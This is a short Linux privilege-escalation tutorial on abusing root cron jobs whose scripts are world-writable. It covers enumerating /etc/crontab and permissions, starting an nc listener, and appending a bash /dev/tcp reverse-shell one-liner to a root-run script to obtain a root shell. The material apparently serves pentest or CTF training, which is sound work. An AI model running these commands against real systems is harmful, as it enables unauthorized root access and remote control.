# Linux PrivEsc: Exploiting Cron Jobs

## 1. Concept

**Cron Jobs** are scripts or commands scheduled to run at specific intervals (every minute, daily, etc.). They are managed by the `cron` daemon.

**The Vulnerability:**

If a Cron Job is configured to run as **root**, and the script/binary it executes has **weak permissions** (world-writable), we can modify that script to include a malicious command. When the timer hits, the system executes our code as root.

---

## 2. Enumeration (Finding the Job)

### Check System-wide Cron Jobs

You can see the scheduled tasks in the system's crontab file:

Bash

```
cat /etc/crontab
```

### What to Look For:

In the output, look for tasks running as `root` that point to scripts you can edit.

- **Example Line:** `* * * * * root /usr/local/bin/backup.sh`
    
- _(This means the script runs every minute as root)._
    

### Check File Permissions:

Once you find a script, check if you have permission to write to it:

Bash

```
ls -l /usr/local/bin/backup.sh
```

If you see `-rwxrwxrwx` or even `-rwxr--rw-`, it means you can modify it!

---

## 3. The Exploit Procedure

### Step 1: Create a Reverse Shell Payload

Instead of deleting the script, just append a reverse shell command to it. You can use a Bash one-liner.

**On your Attacker Machine:**

Start a listener:

Bash

```
nc -lvnp 4444
```

**On the Victim Machine:**

Append the payload to the vulnerable script:

Bash

```
echo "bash -i >& /dev/tcp/YOUR_IP/4444 0>&1" >> /usr/local/bin/backup.sh
```

### Step 2: Wait for Execution

Since Cron Jobs are automated, you just need to wait for the next interval (e.g., the next minute).

**Outcome:** The Cron daemon runs the script $\rightarrow$ it executes your appended line $\rightarrow$ you receive a **Root Shell** on your listener.